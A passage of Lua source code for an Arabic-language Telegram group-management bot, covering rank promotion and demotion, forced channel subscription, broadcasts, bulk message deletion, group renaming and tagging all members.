if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n??┇ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'R_IQ9')..')'..'\n☑️┇ تم رفعه '..RTPA..' هنا\n')   
database:set(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_,RTPA) 
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.sender_user_id_)  
elseif blakrt == 'ادمن' and Manager(msg) then 
send(msg.chat_id_, msg.id_,'\n👤┇ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'R_IQ9')..')'..'\n☑️┇ تم رفعه '..RTPA..' هنا\n')   
database:set(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_,RTPA)
database:sadd(bot_id..'Mod:User'..msg.chat_id_,result.sender_user_id_)  
elseif blakrt == 'مدير' and Constructor(msg) then
send(msg.chat_id_, msg.id_,'\n👤┇ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'R_IQ9')..')'..'\n☑️┇ تم رفعه '..RTPA..' هنا\n')   
database:set(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_,RTPA)  
database:sadd(bot_id..'Manager'..msg.chat_id_,result.sender_user_id_)  
elseif blakrt == 'عضو' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n👤┇ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'R_IQ9')..')'..'\n☑️┇ تم رفعه '..RTPA..' هنا\n')   
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match('تنزيل (.*)') and tonumber(msg.reply_to_message_id_) > 0 and Mod(msg) then 
local RTPA = text:match('تنزيل (.*)')
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
if database:sismember(bot_id..'Coomds'..msg.chat_id_,RTPA) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local blakrt = database:get(bot_id.."Comd:New:rt:bot:"..RTPA..msg.chat_id_)
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n👤┇ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'R_IQ9')..')'..'\n☑️┇ تم تنزيله من '..RTPA..' هنا\n')   
database:srem(bot_id..'Special:User'..msg.chat_id_,result.sender_user_id_)  
database:del(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_)
elseif blakrt == 'ادمن' and Manager(msg) then 
send(msg.chat_id_, msg.id_,'\n👤┇ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'R_IQ9')..')'..'\n☑️┇ تم تنزيله من '..RTPA..' هنا\n')   
database:srem(bot_id..'Mod:User'..msg.chat_id_,result.sender_user_id_) 
database:del(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_)
elseif blakrt == 'مدير' and Constructor(msg) then
send(msg.chat_id_, msg.id_,'\n👤┇ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'R_IQ9')..')'..'\n☑️┇ تم تنزيله من '..RTPA..' هنا\n')   
database:srem(bot_id..'Manager'..msg.chat_id_,result.sender_user_id_)  
database:del(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_)
elseif blakrt == 'عضو' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n👤┇ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'R_IQ9')..')'..'\n☑️┇ تم تنزيله من '..RTPA..' هنا\n')   
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match('^رفع (.*) @(.*)') and Mod(msg) then 
local text1 = {string.match(text, "^(رفع) (.*) @(.*)$")}
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
if database:sismember(bot_id..'Coomds'..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local blakrt = database:get(bot_id.."Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n👤┇ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'R_IQ9')..')'..'\n☑️┇ تم رفعه '..text1[2]..' هنا')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
database:set(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.id_,text1[2])
elseif blakrt == 'ادمن' and Manager(msg) then 
send(msg.chat_id_, msg.id_,'\n👤┇ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'R_IQ9')..')'..'\n☑️┇ تم رفعه '..text1[2]..' هنا')   
database:sadd(bot_id..'Mod:User'..msg.chat_id_,result.id_)  
database:set(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.id_,text1[2])
elseif blakrt == 'مدير' and Constructor(msg) then
send(msg.chat_id_, msg.id_,'\n👤┇ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'R_IQ9')..')'..'\n☑️┇ تم رفعه '..text1[2]..' هنا')   
database:sadd(bot_id..'Manager'..msg.chat_id_,result.id_)  
database:set(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.id_,text1[2])
elseif blakrt == 'عضو' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n👤┇ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'R_IQ9')..')'..'\n☑️┇ تم رفعه '..text1[2]..' هنا')   
end
else
info = '⚠️┇ المعرف غلط'
send(msg.chat_id_, msg.id_,info)
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end 
end
if text and text:match('^تنزيل (.*) @(.*)') and Mod(msg) then 
local text1 = {string.match(text, "^(تنزيل) (.*) @(.*)$")}
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
if database:sismember(bot_id..'Coomds'..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local blakrt = database:get(bot_id.."Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n👤┇ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'R_IQ9')..')'..'\n☑️┇ تم تنريله من '..text1[2]..' هنا')   
database:srem(bot_id..'Special:User'..msg.chat_id_,result.id_)  
database:del(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.id_)
elseif blakrt == 'ادمن' and Manager(msg) then 
send(msg.chat_id_, msg.id_,'\n👤┇ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'R_IQ9')..')'..'\n☑️┇ تم تنريله من '..text1[2]..' هنا')   
database:srem(bot_id..'Mod:User'..msg.chat_id_,result.id_)  
database:del(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.id_)
elseif blakrt == 'مدير' and Constructor(msg) then
send(msg.chat_id_, msg.id_,'\n👤┇ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'R_IQ9')..')'..'\n☑️┇ تم تنريله من '..text1[2]..' هنا')   
database:srem(bot_id..'Manager'..msg.chat_id_,result.id_)  
database:del(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.id_)
elseif blakrt == 'عضو' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n👤┇ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'R_IQ9')..')'..'\n☑️┇ تم تنريله من '..text1[2]..' هنا')   
end
else
info = '⚠️┇ المعرف غلط'
send(msg.chat_id_, msg.id_,info)
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end  
end
if text == "مسح رسايلي" or text == "مسح رسائلي" or text == "حذف رسايلي" or text == "حذف رسائلي" then  
send(msg.chat_id_, msg.id_,'܁༯┆تم مسح جميع رسائلك ↝ ܰ')  
database:del(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) 
end
if text == "رسايلي" or text == "رسائلي" or text == "msg" then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
send(msg.chat_id_, msg.id_,'܁༯┆عدد رسائل الحلو ◃ ['..database:get(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_)..'](t.me/R_IQ9) ↝ ܰ' ) 
end 
if text == 'تفعيل الاذاعه' and SudoBot(msg) then  
if database:get(bot_id..'Bc:Bots') then
database:del(bot_id..'Bc:Bots') 
Text = '\n܁༯┆هلو عمري  ↝ ܰ\n܁༯┆تم تفعيل الاذاعةه ↝ ܰ' 
else
Text = '\n܁༯┆هلو عمري  ↝ ܰ\n܁༯┆ بالتاكيد تم تفعيل الاذاعةه ↝ ܰ '
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الاذاعه' and SudoBot(msg) then  
if not database:get(bot_id..'Bc:Bots') then
database:set(bot_id..'Bc:Bots',true) 
Text = '\n܁༯┆تم تعطيل الاذاعةه  ↝ ܰ' 
else
Text = '\n܁༯┆بالتأكيد تم تفعيل الاذاعةه ↝ ܰ '
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل التواصل' and SudoBot(msg) then  
if database:get(bot_id..'Tuasl:Bots') then
database:del(bot_id..'Tuasl:Bots') 
Text = '\n܁༯┆تم تفعيل التواصل ↝ ܰ ' 
else
Text = '\n܁༯┆بالتأكيد تم تفعيل التواصل ↝ ܰ '
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل التواصل' and SudoBot(msg) then  
if not database:get(bot_id..'Tuasl:Bots') then
database:set(bot_id..'Tuasl:Bots',true) 
Text = '\n܁༯┆تم تعطيل التواصل ↝ ܰ ' 
else
Text = '\n܁༯┆بالتأكيد تم تعطيل التواصل ↝ ܰ '
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل البوت خدمي' and SudoBot(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
if database:get(bot_id..'Free:Bots') then
database:del(bot_id..'Free:Bots') 
Text = '\n܁༯┆تم تفعيل البوت الخدمي ↝ ܰ  ' 
else
Text = '\n܁༯┆بالتأكيد تم تفعيل البوت الخدمي ↝ ܰ  '
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل البوت خدمي' and SudoBot(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
if not database:get(bot_id..'Free:Bots') then
database:set(bot_id..'Free:Bots',true) 
Text = '\n܁༯┆تم تعطيل البوت الخدمي ↝ ܰ ' 
else
Text = '\n܁༯┆بالتأكيد تم تعطيل البوت الخدمي ↝ ܰ '
end
send(msg.chat_id_, msg.id_,Text) 
end
if text and text:match('^تنظيف (%d+)$') and Manager(msg) then
if not database:get(bot_id..'VVVZVV:Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then           
local num = tonumber(text:match('^تنظيف (%d+)$')) 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⌔︙لا تستطيع استخدام البوت \n  ⌔︙يرجى الاشتراك بالقناه اولا \n  ⌔︙اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if num > 1000 then 
send(msg.chat_id_, msg.id_,'⌔︙تستطيع التنظيف 1000 رساله كحد اقصى') 
return false  
end  
local msgm = msg.id_
for i=1,tonumber(num) do
DeleteMessage(msg.chat_id_, {[0] = msgm})
msgm = msgm - 1048576
end
send(msg.chat_id_,msg.id_,'⌔︙تم حذف {'..num..'}')  
database:setex(bot_id..'VVVZVV:Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
end
end
if (msg.content_.animation_) or (msg.content_.photo_) or (msg.content_.video_) or (msg.content_.document) or (msg.content_.sticker_) and msg.reply_to_message_id_ == 0 then
database:sadd(bot_id.."VVVZVV:allM"..msg.chat_id_, msg.id_)
end

if text == "تغير اسم البوت" or text == "تغيير اسم البوت" then 
if SudoBot(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
database:setex(bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_,"܁༯┆ارسل الي الاسم الان ↝ ܰ ")  
end
return false
end

if text == ""..(database:get(bot_id..'Name:Bot') or 'اسو').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'اسو')
local MILAN_Msg = {
'عمغي 🥺↝↝ .',
'هلا ابو الحب 💘💘 .'
}
send(msg.chat_id_, msg.id_,'['..MILAN_Msg[math.random(#MILAN_Msg)]..']') 
return false
end
if text=="اذاعه خاص" and msg.reply_to_message_id_ == 0 and Sudo(msg) then 
if database:get(bot_id..'Bc:Bots') and not SudoBot(msg) then 
send(msg.chat_id_, msg.id_,'܁༯┆ ههلو ععمري  ↝ ܰ\n܁༯┆ الاذاعةه معطلة من المطور الاساسي 😹😔 ܰ')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
database:setex(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"܁༯┆هلو عمري ↝ ܰ\n܁༯┆ارسل لي سواء كان . .\n܁༯┆ملصق ◃ متحركة ◃ فيد ◃ صوره ◃ رسالة ܊\n܁༯┆للخروج ارسل ܊ الغاء ܊") 
return false
end 
if text=="اذاعه" and msg.reply_to_message_id_ == 0 and Sudo(msg) then 
if database:get(bot_id..'Bc:Bots') and not SudoBot(msg) then 
send(msg.chat_id_, msg.id_,'܁༯┆ ههلو ععمري  ↝ ܰ\n܁༯┆ الاذاعةه معطلة من المطور الاساسي 😹😔 ܰ')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
database:setex(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"܁༯┆هلو عمري ↝ ܰ\n܁༯┆ارسل لي سواء كان . .\n܁༯┆ملصق ◃ متحركة ◃ فيد ◃ صوره ◃ رسالة ܊\n܁༯┆للخروج ارسل ܊ الغاء ܊") 
return false
end  
if text=="اذاعه بالتوجيه" and msg.reply_to_message_id_ == 0  and Sudo(msg) then 
if database:get(bot_id..'Bc:Bots') and not SudoBot(msg) then 
send(msg.chat_id_, msg.id_,'܁༯┆ ههلو ععمري  ↝ ܰ\n܁༯┆ الاذاعةه معطلة من المطور الاساسي 😹😔 ܰ')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
database:setex(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"܁༯┆ ههلو ععمري ↝ ܰ\n܁༯┆ ارسل التوجيةه الي الان ↝ ܰ") 
return false
end 
if text=="اذاعه بالتوجيه خاص" and msg.reply_to_message_id_ == 0  and Sudo(msg) then 
if database:get(bot_id..'Bc:Bots') and not SudoBot(msg) then 
send(msg.chat_id_, msg.id_,'܁༯┆ ههلو ععمري  ↝ ܰ\n܁༯┆ الاذاعةه معطلة من المطور الاساسي 😹😔 ܰ')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
database:setex(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"܁༯┆ ههلو ععمري ?? ܰ\n܁༯┆ ارسل التوجيةه الي الان ↝ ܰ") 
return false
end 
if text and text:match('^ضع اسم (.*)') and Manager(msg) or text and text:match('^وضع اسم (.*)') and Manager(msg) then 
local Name = text:match('^ضع اسم (.*)') or text:match('^وضع اسم (.*)') 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
tdcli_function ({ ID = "ChangeChatTitle",chat_id_ = msg.chat_id_,title_ = Name },function(arg,data) 
if data.message_ == "Channel chat title can be changed by administrators only" then
send(msg.chat_id_,msg.id_,"܁༯┆البوت ليس ادمن يرجى ترقيتي ↝ ܰ")  
return false  
end 
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"܁༯┆ليس لدي صلاحيةه تغير اسم المجموعةه 😭↝ ܰ ")  
else
sebd(msg.chat_id_,msg.id_,'܁༯┆تم تغير اسم المجموعةه الى ◃ ['..Name..']')  
end
end,nil) 
end

if text == "تاك للكل" or text == "تاك الكل" and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 200
},function(ta,MILAN)
local t = "\n٭ 𖤓 ┆ههلاو يَمحتحتين ↝↝◟\n܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀\n"
x = 0
local list = MILAN.members_
for k, v in pairs(list) do
x = x + 1
if database:get(bot_id..'user:Name'..v.user_id_) then
t = t.."𖠵 "..x.." ◜*@"..database:get(bot_id..'user:Name'..v.user_id_).."*◞  ↝🦄 .\n"
else
end
end
send(msg.chat_id_,msg.id_,t)
end,nil)
end
if text == ("تنزيل الكل") and msg.reply_to_message_id_ ~= 0 and Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
function start_function(extra, result, success)
if tonumber(SUDO) == tonumber(result.sender_user_id_) then
send(msg.chat_id_, msg.id_,"܁༯┆لا تستطيع تنزيل المطور ألاساسي ↝ ܰ ")
return false 
end
if database:sismember(bot_id..'Sudo:User',result.sender_user_id_) then
dev = ' المطور ،' else dev = '' end
if database:sismember(bot_id..'Basic:Constructor'..msg.chat_id_, result.sender_user_id_) then
crr = ' منشئ اساسي ،' else crr = '' end
if database:sismember(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_) then
cr = ' منشئ ،' else cr = '' end
if database:sismember(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_) then
own = ' مدير ،' else own = '' end
if database:sismember(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_) then
mod = ' ادمن ،' else mod = '' end
if database:sismember(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_) then
vip = ' مميز ،' else vip = ''
end
if Can_or_NotCan(result.sender_user_id_,msg.chat_id_) ~= false then
send(msg.chat_id_, msg.id_,"\n܁༯┆هلو عمري ↝ ܰ\n܁༯┆تم تنزيل [العضو](t.me/R_IQ9) ↝ ܰ\n܁༯┆ ܊  "..dev..''..crr..''..cr..''..own..''..mod..''..vip.." ܊\n")
else
send(msg.chat_id_, msg.id_,"\n܁༯┆ليس لديةه رتب حتئ استطيع تنزيل 😹😭↝ ܰ  \n")
end
if tonumber(SUDO) == tonumber(msg.sender_user_id_) then
database:srem(bot_id..'Sudo:User', result.sender_user_id_)
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'Sudo:User',msg.sender_user_id_) then
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_,result.sender_user_id_)
elseif database:sismember(bot_id..'Basic:Constructor'..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'Constructor'..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'Manager'..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end

if text and text:match("^تنزيل الكل @(.*)$") and Manager(msg) then
local username = text:match("^تنزيل الكل @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
function start_function(extra, result, success)
if tonumber(SUDO) == tonumber(result.sender_user_id_) then
send(msg.chat_id_, msg.id_,"܁༯┆لا تستطيع تنزيل المطور ألاساسي ↝ ܰ ")
return false 
end
if database:sismember(bot_id..'Sudo:User',result.sender_user_id_) then
dev = ' المطور ،' else dev = '' end
if database:sismember(bot_id..'Basic:Constructor'..msg.chat_id_, result.sender_user_id_) then
crr = ' منشئ اساسي ،' else crr = '' end
if database:sismember(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_) then
cr = ' منشئ ،' else cr = '' end
if database:sismember(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_) then
own = ' مدير ،' else own = '' end
if database:sismember(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_) then
mod = ' ادمن ،' else mod = '' end
if database:sismember(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_) then
vip = ' مميز ،' else vip = ''
end
if Can_or_NotCan(result.sender_user_id_,msg.chat_id_) ~= false then
send(msg.chat_id_, msg.id_,"\n܁༯┆هلو عمري ↝ ܰ\n܁༯┆تم تنزيل [العضو](t.me/R_IQ9) ↝ ܰ\n܁༯┆ ܊  "..dev..''..crr..''..cr..''..own..''..mod..''..vip.." ܊\n")
else
send(msg.chat_id_, msg.id_,"\n܁༯┆ليس لديةه رتب حتئ استطيع تنزيل 😹😭↝ ܰ  \n")
end
if tonumber(SUDO) == tonumber(msg.sender_user_id_) then
database:srem(bot_id..'Sudo:User', result.sender_user_id_)
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'Sudo:User',msg.sender_user_id_) then
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_,result.sender_user_id_)
elseif database:sismember(bot_id..'Basic:Constructor'..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'Constructor'..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'Manager'..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end

if text == ("مسح ردود المطور") and SudoBot(msg) then 
local list = database:smembers(bot_id..'List:Rd:Sudo')
for k,v in pairs(list) do
